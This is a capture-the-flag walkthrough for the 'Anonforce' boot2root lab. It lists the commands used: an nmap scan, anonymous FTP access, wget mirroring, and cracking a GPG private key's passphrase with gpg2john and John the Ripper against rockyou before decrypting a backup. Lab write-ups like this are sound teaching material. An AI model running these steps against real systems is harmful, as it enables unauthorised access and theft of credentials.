# Anonforce
boot2root machine for FIT and bsides guatemala CTF

10.201.110.177

## User Flag

`:> nmap 10.201.110.177`

 ![nmap 1](assets/anonforce-01-nmap-01.png)  

 Perform anonymous login  

 ![ftp 1](assets/anonforce-02-ftp-01.png) 

 Attempt to download the file via the ftp but fails.

 `get melodias`

![ftp 1](assets/anonforce-03-ftp-02.png)

Exit out the command line and try combining the wget and ftp protocols  

`:> wget -m --ftp-user=anonymous --ftp-password='' ftp://10.201.110.177/home/melodias`  

![wget 1](assets/anonforce-04-wget-01.png)

Downloaded nine files

![wget 2](assets/anonforce-05-wget-02.png)

Move into the downloaded directories and simultaneously realize why the ftp commands didn't work correctly :shrug:

![User.txt](assets/anonforce-06-user-txt.png)


## Root Flag

Clearly the "notread" directly is a target.  
This directory contains two files. 

![notread directory](assets/anonforce-07-root-01.png)

Use `:> mget .` to retrieve all (both) files.

![mget the files](assets/anonforce-09-root-02.png)

Exit the ftp
locate the downloaded files and place them into their own directly, for ease of use.

![notread directory](assets/anonforce-10-root-03a.png)


Convert the private key to something which can be further exploited. The most common tool for this is John the Ripper.

`gpg2john private.asc > privateOut`

![privateout](assets/anonforce-11-root-04.png)

Use John the Ripper to identify teh password

`john privateOut --wordlist=/usr/share/wordlist/rockyou.txt`

![cracked](assets/anonforce-12-root-05.png)

Import the private key with the discovered password

`gpg --import private.asc`

![key import](assets/anonforce-13-root-06.png)

![key import result](assets/anonforce-14-root-07.png)

Decrypt the backup file

`gpg --decrypt backup.pgp > plainbackup.txt`

![plaintext backup](assets/anonforce-15-root-08.png)



